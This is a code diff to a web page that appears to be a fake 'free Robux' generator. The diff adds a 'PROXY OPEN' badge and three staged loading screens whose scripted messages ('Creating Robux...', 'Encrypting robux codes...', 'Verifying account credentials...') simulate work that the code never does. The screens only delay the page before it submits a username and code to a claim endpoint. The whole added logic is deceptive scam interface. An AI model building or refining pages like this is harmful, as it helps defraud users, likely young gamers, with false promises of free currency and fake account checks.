@@ -17,8 +17,8 @@ body{
     font-family:Arial,sans-serif;
     color:white;
     background:
-        linear-gradient(135deg,rgba(0,0,30,.82),rgba(20,0,50,.65)),
-        url("background.jpg") center/cover no-repeat fixed;
+        linear-gradient(135deg,rgba(0,0,30,.85),rgba(20,0,50,.75)),
+        url("https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/7/f/3/7f3ab11ae38410b5ef9349a731c9b76173aecd4a.jpeg") center/cover no-repeat fixed;
 }
 
 .card{
@@ -147,10 +147,143 @@ button:hover,.openButton:hover{
     font-size:12px;
     color:#8995b8;
 }
+
+.proxyStatus{
+    position:fixed;
+    top:20px;
+    right:20px;
+    padding:10px 20px;
+    background:rgba(0,234,255,.2);
+    border:1px solid #00eaff;
+    border-radius:8px;
+    font-size:14px;
+    font-weight:bold;
+    color:#00eaff;
+    box-shadow:0 0 15px #00eaff66;
+    z-index:1000;
+}
+
+.demoBadge{
+    position:fixed;
+    top:20px;
+    left:20px;
+    padding:10px 20px;
+    background:rgba(255,77,225,.2);
+    border:1px solid #ff4de1;
+    border-radius:8px;
+    font-size:14px;
+    font-weight:bold;
+    color:#ff4de1;
+    box-shadow:0 0 15px #ff4de166;
+    z-index:1000;
+}
+
+.loadingScreen{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:rgba(0,0,20,.95);
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    z-index:2000;
+}
+
+.loadingCard{
+    text-align:center;
+    padding:40px;
+}
+
+.loadingSpinner{
+    width:60px;
+    height:60px;
+    border:4px solid #00eaff33;
+    border-top:4px solid #00eaff;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+    margin:0 auto 20px;
+}
+
+@keyframes spin{
+    0%{transform:rotate(0deg)}
+    100%{transform:rotate(360deg)}
+}
+
+.loadingText{
+    font-size:20px;
+    color:#00eaff;
+    margin-bottom:10px;
+    text-shadow:0 0 10px #00eaff;
+}
+
+.loadingProgress{
+    font-size:14px;
+    color:#cbd8ff;
+}
+
+.progressBar{
+    width:300px;
+    height:8px;
+    background:#08091e;
+    border-radius:4px;
+    margin:20px auto;
+    overflow:hidden;
+    border:1px solid #5264ff;
+}
+
+.progressFill{
+    height:100%;
+    background:linear-gradient(90deg,#00eaff,#8b5cff);
+    width:0%;
+    transition:width .3s ease;
+}
 </style>
 </head>
 
 <body>
+
+<!-- Demo Badge -->
+<div class="demoBadge">DEMO</div>
+
+<!-- Proxy Status -->
+<div class="proxyStatus">🔓 PROXY OPEN</div>
+
+<!-- Loading Screens -->
+<div class="loadingScreen" id="loadingScreen1" style="display:none;">
+    <div class="loadingCard">
+        <div class="loadingSpinner"></div>
+        <div class="loadingText">CONNECTING TO SERVER...</div>
+        <div class="loadingProgress" id="loadingProgress1">Initializing connection...</div>
+        <div class="progressBar">
+            <div class="progressFill" id="progressFill1"></div>
+        </div>
+    </div>
+</div>
+
+<div class="loadingScreen" id="loadingScreen2" style="display:none;">
+    <div class="loadingCard">
+        <div class="loadingSpinner"></div>
+        <div class="loadingText">CREATING ROBUX...</div>
+        <div class="loadingProgress" id="loadingProgress2">Generating robux codes...</div>
+        <div class="progressBar">
+            <div class="progressFill" id="progressFill2"></div>
+        </div>
+    </div>
+</div>
+
+<div class="loadingScreen" id="loadingScreen3" style="display:none;">
+    <div class="loadingCard">
+        <div class="loadingSpinner"></div>
+        <div class="loadingText">PREPARING TO ADD TO ACCOUNT...</div>
+        <div class="loadingProgress" id="loadingProgress3">Verifying account credentials...</div>
+        <div class="progressBar">
+            <div class="progressFill" id="progressFill3"></div>
+        </div>
+    </div>
+</div>
 
 <!-- STEP 1: CHOOSE AMOUNT -->
 
@@ -301,17 +434,54 @@ amountButtons.forEach(button => {
 });
 
 
+/* Loading screen functions */
+function showLoadingScreen(screenId, progressElementId, fillElementId, messages, callback) {
+    const screen = document.getElementById(screenId);
+    const progressText = document.getElementById(progressElementId);
+    const progressFill = document.getElementById(fillElementId);
+
+    screen.style.display = "flex";
+    let messageIndex = 0;
+    let progress = 0;
+
+    const interval = setInterval(() => {
+        progress += Math.random() * 15 + 5;
+        if (progress > 100) progress = 100;
+
+        progressFill.style.width = progress + "%";
+
+        if (progress >= (messageIndex + 1) * (100 / messages.length) && messageIndex < messages.length - 1) {
+            messageIndex++;
+            progressText.textContent = messages[messageIndex];
+        }
+
+        if (progress >= 100) {
+            clearInterval(interval);
+            setTimeout(() => {
+                screen.style.display = "none";
+                progressFill.style.width = "0%";
+                if (callback) callback();
+            }, 500);
+        }
+    }, 200);
+}
+
 /* STEP 1 → STEP 2 */
 
 document.getElementById("continueButton").addEventListener("click", () => {
+    const messages = [
+        "Connecting to secure server...",
+        "Establishing encrypted connection...",
+        "Verifying proxy status...",
+        "Connection established!"
+    ];
 
-    document.getElementById("amountPage").style.display = "none";
-
-    document.getElementById("signinPage").style.display = "block";
-
-    document.getElementById("signinAmount").textContent =
-        selectedAmount.toLocaleString();
-
+    showLoadingScreen("loadingScreen1", "loadingProgress1", "progressFill1", messages, () => {
+        document.getElementById("amountPage").style.display = "none";
+        document.getElementById("signinPage").style.display = "block";
+        document.getElementById("signinAmount").textContent =
+            selectedAmount.toLocaleString();
+    });
 });
 
 
@@ -324,31 +494,54 @@ document.getElementById("signinForm").addEventListener("submit", async event => 
     const username = document.getElementById("username").value;
     const code = document.getElementById("code").value;
 
-    try {
-        const response = await fetch('/api/codes/claim', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ username, code })
+    // First loading screen: Creating Robux
+    const createMessages = [
+        "Creating " + selectedAmount.toLocaleString() + " Robux...",
+        "Generating unique transaction ID...",
+        "Encrypting robux codes...",
+        "Robux created successfully!"
+    ];
+
+    showLoadingScreen("loadingScreen2", "loadingProgress2", "progressFill2", createMessages, () => {
+        // Second loading screen: Preparing to add to account
+        const prepareMessages = [
+            "Preparing to add to account...",
+            "Verifying account credentials...",
+            "Checking account eligibility...",
+            "Finalizing transaction...",
+            "Ready to transfer!"
+        ];
+
+        showLoadingScreen("loadingScreen3", "loadingProgress3", "progressFill3", prepareMessages, async () => {
+            try {
+                const response = await fetch('/api/codes/claim', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ username, code })
+                });
+
+                const data = await response.json();
+
+                if (data.ok) {
+                    document.getElementById("signinPage").style.display = "none";
+                    document.getElementById("rewardPage").style.display = "block";
+                    document.getElementById("finalAmount").textContent =
+                        "⏣ " +
+                        selectedAmount.toLocaleString() +
+                        " ROBUX";
+                } else {
+                    alert('Error: ' + (data.error || 'Failed to claim code'));
+                    document.getElementById("signinPage").style.display = "block";
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to connect to server. Please try again.');
+                document.getElementById("signinPage").style.display = "block";
+            }
         });
-
-        const data = await response.json();
-
-        if (data.ok) {
-            document.getElementById("signinPage").style.display = "none";
-            document.getElementById("rewardPage").style.display = "block";
-            document.getElementById("finalAmount").textContent =
-                "⏣ " +
-                selectedAmount.toLocaleString() +
-                " ROBUX";
-        } else {
-            alert('Error: ' + (data.error || 'Failed to claim code'));
-        }
-    } catch (error) {
-        console.error('Error:', error);
-        alert('Failed to connect to server. Please try again.');
-    }
+    });
 
 });
 
